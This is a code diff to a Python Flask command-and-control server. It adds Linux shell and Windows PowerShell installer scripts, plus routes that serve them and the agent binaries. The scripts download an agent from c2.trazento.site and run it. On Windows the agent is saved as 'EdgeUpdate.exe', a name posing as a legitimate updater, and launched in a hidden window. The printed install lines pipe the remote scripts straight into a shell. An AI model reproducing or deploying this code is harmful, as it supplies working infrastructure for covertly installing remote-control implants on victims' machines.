@@ -316,6 +316,69 @@ def dashboard():
     resp.set_cookie("token", DASH_TOKEN, max_age=86400)
     return resp
 
+# ─── install scripts ─────────────────────────────────────────────────
+INSTALL_SH = r"""#!/bin/sh
+set -e
+SERVER="https://c2.trazento.site"
+echo "[*] C2 Agent installer"
+case "$(uname -s)" in
+  Linux)  OS="linux"  ;;
+  Darwin) OS="linux"  ;;
+  *)      echo "unsupported OS"; exit 1 ;;
+esac
+ARCH="$(uname -m)"
+case "$ARCH" in
+  x86_64|amd64) ARCH="x86_64" ;;
+  aarch64|arm64) ARCH="aarch64" ;;
+  *) echo "unsupported arch: $ARCH"; exit 1 ;;
+esac
+URL="$SERVER/agent/linux/$ARCH"
+echo "[*] Downloading $URL"
+if command -v curl >/dev/null 2>&1; then
+  curl -sS -o /tmp/c2_agent "$URL"
+elif command -v wget >/dev/null 2>&1; then
+  wget -q -O /tmp/c2_agent "$URL"
+else
+  echo "need curl or wget"; exit 1
+fi
+chmod +x /tmp/c2_agent
+echo "[*] Starting agent..."
+exec /tmp/c2_agent
+"""
+
+INSTALL_PS1 = r"""$server = "https://c2.trazento.site"
+$out = "$env:TEMP\EdgeUpdate.exe"
+Write-Host "[*] Downloading C2 agent..."
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+iwr "$server/agent/windows/x86_64" -OutFile $out
+Write-Host "[*] Starting agent..."
+Start-Process -WindowStyle Hidden -FilePath $out
+"""
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+@app.route('/install.sh')
+def serve_install_sh():
+    return Response(INSTALL_SH, mimetype='text/x-sh')
+
+@app.route('/install.ps1')
+def serve_install_ps1():
+    return Response(INSTALL_PS1, mimetype='text/x-powershell')
+
+@app.route('/agent/linux/<arch>')
+def serve_agent_linux(arch):
+    path = os.path.join(BASE_DIR, "c2_agent")
+    if not os.path.exists(path):
+        return jsonify({"error": "agent binary not found"}), 404
+    return Response(open(path, 'rb').read(), mimetype='application/octet-stream')
+
+@app.route('/agent/windows/<arch>')
+def serve_agent_windows(arch):
+    path = os.path.join(BASE_DIR, "EdgeUpdate.exe")
+    if not os.path.exists(path):
+        return jsonify({"error": "agent binary not found"}), 404
+    return Response(open(path, 'rb').read(), mimetype='application/octet-stream')
+
 if __name__ == '__main__':
     import sys
     use_tls = "--no-tls" not in sys.argv
@@ -323,6 +386,8 @@ if __name__ == '__main__':
     print(f"[C2] Server key: {KEY_B64}")
     print(f"[C2] Dashboard token: {DASH_TOKEN}")
     print(f"[C2] Dashboard: http://127.0.0.1:8443/?token={DASH_TOKEN}")
+    print(f"[C2] Install (Linux): curl -sS https://c2.trazento.site/install.sh | sh")
+    print(f"[C2] Install (Windows): iex (iwr https://c2.trazento.site/install.ps1)")
     print(f"[C2] Listening on {proto}://0.0.0.0:8443")
     if use_tls:
         ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
